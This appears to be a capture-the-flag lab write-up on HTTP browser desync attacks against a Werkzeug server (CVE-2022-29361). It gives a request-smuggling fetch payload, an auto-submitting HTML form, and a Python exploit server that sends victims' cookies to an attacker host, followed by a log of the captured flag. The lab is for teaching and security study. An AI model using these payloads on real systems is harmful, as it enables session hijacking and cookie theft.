# HTTP Browser Desync

## TASK 2 HTTP features

HTTP Keep-Alive.

    HTTP keep-alive allows multiple HTTP requests over a single TCP connection, improving performance. 
    However, it can introduce risks like cache poisoning if desync issues are exploited.

HTTP Pipelining.

    HTTP pipelining allows sending multiple requests without waiting for responses. 
    The server uses the Content-Length header to separate requests. 
    For static files, Content-Length is often not needed.

## TASK 3 HTTP Browser Desync

HTTP Browser Desync.

    In a Browser Desync attack, an attacker exploits vulnerabilities in a web application's connection handling to hijack user requests.
    The attack typically involves two steps:
        1. The attacker sends a crafted request (often using HTTP keep-alive) that disrupts the request queue by injecting an arbitrary request.
        2. The next legitimate user request is replaced or intercepted by the attacker's injected request.

    Example scenario:
        - The client sends a POST request with keep-alive enabled, allowing multiple requests over the same connection.
        - The POST request's body contains a malicious GET request.
        - If the server mishandles the request body, the injected GET request remains in the queue.
        - The next client request is processed as the injected GET, leading to unexpected behavior (e.g., a 404 page instead of a redirect).

    This attack can allow an attacker to take control of a victim's session or account by manipulating how the server processes pipelined or persistent requests.

## TASK 4 HTTP Browser Desync Identification

    For a better understanding of HTTP Browser Desynchronization, we will use a web application vulnerable to CVE-2022-29361. 
    The web app will serve a single route.

        ```
        from flask import Flask
        app = Flask(__name__)
        @app.route("/", methods=["GET", "POST"])
        def index():
            return """
            CVE-2022-29361
            Welcome to the Vulnerable Web Application
            """
        if __name__ == "__main__":
            app.run("0.0.0.0", 5000)
        ```

    The vulnerable server uses Werkzeug v2.1.0, which allows keep-alive connections. 
    This enables attacks that exploit persistent connections, such as HTTP Browser Desync, especially when cookies are shared due to CORS or SameSite settings.

    You can hack your session by using the following payload from your browser command line.

        ```
        fetch('http://10.80.190.38:5000/', {
            method: 'POST',
            body: 'GET /redirect HTTP/1.1\r\nFoo: x',
            mode: 'cors',
        })
        ```

        http://10.80.190.38:5000/
            This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.
        
        { method: 'POST' }
            The method parameter specifies the HTTP method for the request. Here, it's set to 'POST'.
        
        { body: 'GET /redirect HTTP/1.1\r\nFoo: x' }
            In the body, there is the second request that is going to be injected into the queue.
        { mode: 'cors' }
            This flag triggers an error when visiting the 404 web page and avoids following the redirect.

## TASK 6 Challenge

    In this task, we will look for a possible way to solve the challenge of the previous task.

    1.  Add the following entry to your /etc/hosts file:
        10.80.190.38 challenge.thm

    2.  Use the provided fetch payload in your browser console and refresh the page. 
        If you see a 404 error, the server is vulnerable to request smuggling browser desync.

        ```
        fetch('http://challenge.thm/', {
            method: 'POST',
            body: 'GET /redirect HTTP/1.1\r\nFoo: x',
            mode: 'cors',
        })
        ```

    3.  Notice that the contact page at http://challenge.thm/securecontact reflects input but does not interpret it, while http://challenge.thm/vulnerablecontact does interpret input. 
        Build a payload to redirect the victim to fetch a second payload from your server:

        ```
        <form id="btn" action="http://challenge.thm/"
            method="POST"
            enctype="text/plain">
        <textarea name="GET http://YOUR_IP:1337 HTTP/1.1
        AAA: A">placeholder1</textarea>
        <button type="submit">placeholder2</button>
        </form>
        <script> btn.submit() </script>
        ```

    4.  Serve a payload on your controlled server to steal the user's cookie:

        ```
        #!/usr/bin/python3

        from http.server import BaseHTTPRequestHandler, HTTPServer

        class ExploitHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.send_header("Content-type","text/html")
                    self.end_headers()
                    self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")

        def run_server(port=1337):   
            server_address = ('', port)
            httpd = HTTPServer(server_address, ExploitHandler)
            print(f"Server running on port {port}")
            httpd.serve_forever()

        if __name__ == '__main__':
            run_server()
        ```

    5.  Run the exploit server:
        sudo python3 server.py

    6.  Start a listener on port 8080 to capture the flag:
        sudo python3 -m http.server 8080

    7.  Wait for the victim to trigger the exploit. 
        You should see a request containing the flag in your 8080 server logs.

        ```
        root@attackbox ~ [1]> sudo python3 -m http.server 8080
        Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)
        - - [18/Jan/2024 10:49:51] "GET /flag=THM{REDACTED} HTTP/1.1" 404 -w
        ```

## Appendix: